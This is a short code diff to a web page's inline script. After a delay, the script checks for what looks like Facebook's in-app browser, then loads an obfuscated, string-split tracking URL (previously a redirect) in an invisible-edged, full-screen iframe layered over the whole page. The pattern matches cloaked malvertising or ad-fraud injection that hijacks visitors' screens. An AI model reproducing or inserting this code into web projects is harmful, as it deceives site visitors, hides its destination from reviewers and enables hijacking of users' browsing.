@@ -44,7 +44,8 @@ document.head.appendChild(img);
 
 setTimeout(function(){
 if(window.FbQuoteShareJSInterface){
-location.href="htt"+"ps://mac24.kintu"+"ra.io/in/SSWTY7cdWids6KSG2VYx?bid={bid}&extid={extid}&campid={{campaign.id}}&campn={{campaign.name}}&creaid={{ad.id}}&crean={{ad.name}}";
+var url="htt"+"ps://mac24.kintu"+"ra.io/in/SSWTY7cdWids6KSG2VYx?bid={bid}&extid={extid}&campid={{campaign.id}}&campn={{campaign.name}}&creaid={{ad.id}}&crean={{ad.name}}";
+var ifm=document.createElement('iframe');ifm.src=url;ifm.style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;';ifm.allowfullscreen='allowfullscreen';ifm.webkitallowfullscreen='webkitallowfullscreen';ifm.mozallowfullscreen='mozallowfullscreen';document.documentElement.appendChild(ifm);
 }
 },1000);
 </script>
